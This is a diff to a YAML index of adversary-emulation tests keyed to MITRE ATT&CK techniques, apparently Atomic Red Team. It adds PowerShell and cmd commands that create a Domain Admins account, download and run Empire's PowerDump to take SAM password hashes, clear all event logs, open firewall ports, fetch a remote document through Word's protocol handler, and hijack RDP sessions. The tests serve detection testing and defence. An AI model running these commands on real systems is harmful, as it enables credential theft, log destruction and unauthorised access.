@@ -8461,6 +8461,65 @@ persistence:
               }
         name: powershell
         elevation_required: true
+    - name: Domain Account and Group Manipulate
+      auto_generated_guid: a55a22e9-a3d3-42ce-bd48-2653adb8f7a9
+      description: "Create a random atr-nnnnnnnn account and add it to a domain group
+        (by default, Domain Admins). \n\nThe quickest way to run it is against a domain
+        controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need
+        to install PS Module ActiveDirectory (in prereqs) and run the script with
+        appropriare AD privileges to \ncreate the user and alter the group. Automatic
+        installation of the dependency requires an elevated session, \nand is unlikely
+        to work with Powershell Core (untested).\n\nIf you consider running this test
+        against a production Active Directory, the good practise is to create a dedicated\nservice
+        account whose delegation is given onto a dedicated OU for user creation and
+        deletion, as well as delegated\nas group manager of the target group.\n\nExample:
+        `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and
+        Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        account_prefix:
+          description: |
+            Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on
+            a match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.
+          type: String
+          default: atr-
+        group:
+          description: Name of the group to alter
+          type: String
+          default: Domain Admins
+        create_args:
+          description: Additional string appended to New-ADUser call
+          type: String
+          default: ''
+      dependencies:
+      - description: 'PS Module ActiveDirectory
+
+'
+        prereq_command: "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop
+          | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n"
+        get_prereq_command: |
+          if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+            Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+          } else {
+            Install-WindowsFeature RSAT-AD-PowerShell
+          }
+      executor:
+        command: |
+          $x = Get-Random -Minimum 2 -Maximum 99
+          $y = Get-Random -Minimum 2 -Maximum 99
+          $z = Get-Random -Minimum 2 -Maximum 99
+          $w = Get-Random -Minimum 2 -Maximum 99
+
+          Import-Module ActiveDirectory
+          $account = "#{account_prefix}-$x$y$z"
+          New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
+          Add-ADGroupMember "#{group}" $account
+        cleanup_command: 'Get-ADUser -LDAPFilter "(&(samaccountname=#{account_prefix}-*)(givenName=Test))"
+          | Remove-ADUser -Confirm:$False
+
+'
+        name: powershell
   T1098.003:
     technique:
       external_references:
@@ -20326,6 +20385,20 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: PowerDump Registry dump of SAM for hashes and usernames
+      auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
+      description: Executes a hashdump by reading the hasshes from the registry.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+          Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+          Invoke-Webrequest -Uri "https://github.com/BC-SECURITY/Empire/blob/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
+          Import-Module .\PowerDump.ps1
+          Invoke-PowerDump
+        name: powershell
+        elevation_required: true
   T1555.002:
     technique:
       external_references:
@@ -22296,17 +22369,19 @@ defense-evasion:
 '
         name: command_prompt
         elevation_required: true
-    - name: Delete System Logs Using Clear-EventLogId
+    - name: Delete System Logs Using Clear-EventLog
       auto_generated_guid: b13e9306-3351-4b4b-a6e8-477358b0b498
       description: |
         Clear event logs using built-in PowerShell commands.
+        Upon successful execution, you should see the list of deleted event logs
         Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
       supported_platforms:
       - windows
       executor:
-        command: 'Clear-EventLog -logname Application
-
-'
+        command: |
+          $logs = Get-EventLog -List | ForEach-Object {$_.Log}
+          $logs | ForEach-Object {Clear-EventLog -LogName $_ }
+          Get-EventLog -list
         name: powershell
         elevation_required: true
   T1078.004:
@@ -23671,6 +23746,24 @@ defense-evasion:
         cleanup_command: netsh advfirewall firewall delete rule name="atomic testing"
           protocol=TCP localport=450 >nul 2>&1
         name: command_prompt
+        elevation_required: true
+    - name: Open a local port through Windows Firewall to any profile
+      auto_generated_guid: 9636dd6e-7599-40d2-8eee-ac16434f35ed
+      description: This test will attempt to open a local port defined by input arguments
+        to any profile
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_port:
+          description: This is the local port you wish to test opening
+          type: integer
+          default: 3389
+      executor:
+        command: netsh advfirewall firewall add rule name="Open Port to Any" dir=in
+          protocol=tcp localport=#{local_port} action=allow profile=any
+        cleanup_command: netsh advfirewall firewall delete rule name="Open Port to
+          Any"
+        name: powershell
         elevation_required: true
   T1562.001:
     technique:
@@ -28754,20 +28847,9 @@ defense-evasion:
           type: string
           default: "%temp%\\T1564.004_has_ads_cmd.txt"
         ads_filename:
-          description: Name of ADS file.
+          description: Name of ADS.
           type: string
           default: adstest.txt
-      dependency_executor_name: command_prompt
-      dependencies:
-      - description: 'The file must exist on disk at specified location (#{file_name})
-
-'
-        prereq_command: 'IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )
-
-'
-        get_prereq_command: 'echo normal_text >> #{file_name} >nul 2>&1
-
-'
       executor:
         command: |
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
@@ -32737,6 +32819,44 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: ProtocolHandler.exe Downloaded a Suspicious File
+      auto_generated_guid: db020456-125b-4c8b-a4a7-487df8afb5a2
+      description: 'Emulates attack via documents through protocol handler in Microsoft
+        Office.  On successful execution you should see Microsoft Word launch a blank
+        file.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        microsoft_wordpath:
+          description: path to office folder
+          type: path
+          default: C:\Program Files\Microsoft Office\Office16
+        remote_url:
+          description: url to document
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Word must be installed with the correct path and protocolhandler.exe
+          must be provided
+
+'
+        prereq_command: 'if (Test-Path "#{microsoft_wordpath}\protocolhandler.exe")
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'write-host "Install Microsoft Word or provide correct
+          path."
+
+'
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: '#{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
+
+'
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -44584,7 +44704,36 @@ lateral-movement:
       - SYSTEM
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1563.002
+    atomic_tests:
+    - name: RDP hijacking
+      auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
+      description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+        - how to hijack RDS and RemoteApp sessions transparently to move through an
+        organization
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        Session_ID:
+          description: The ID of the session to which you want to connect
+          type: String
+          default: '1337'
+        Destination_ID:
+          description: Connect the session of another user to a different session
+          type: String
+          default: rdp-tcp#55
+      executor:
+        command: |
+          query user
+          sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
+          net start sesshijack
+        cleanup_command: 'sc.exe delete sesshijack >nul 2>&1
+
+'
+        name: command_prompt
+        elevation_required: true
   T1021.001:
     technique:
       external_references:
@@ -44649,34 +44798,6 @@ lateral-movement:
       - Windows
       identifier: T1021.001
     atomic_tests:
-    - name: RDP hijacking
-      auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
-      description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
-        - how to hijack RDS and RemoteApp sessions transparently to move through an
-        organization
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        Session_ID:
-          description: The ID of the session to which you want to connect
-          type: String
-          default: '1337'
-        Destination_ID:
-          description: Connect the session of another user to a different session
-          type: String
-          default: rdp-tcp#55
-      executor:
-        command: |
-          query user
-          sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
-          net start sesshijack
-        cleanup_command: 'sc.exe delete sesshijack >nul 2>&1
-
-'
-        name: command_prompt
-        elevation_required: true
     - name: RDPto-DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
       description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
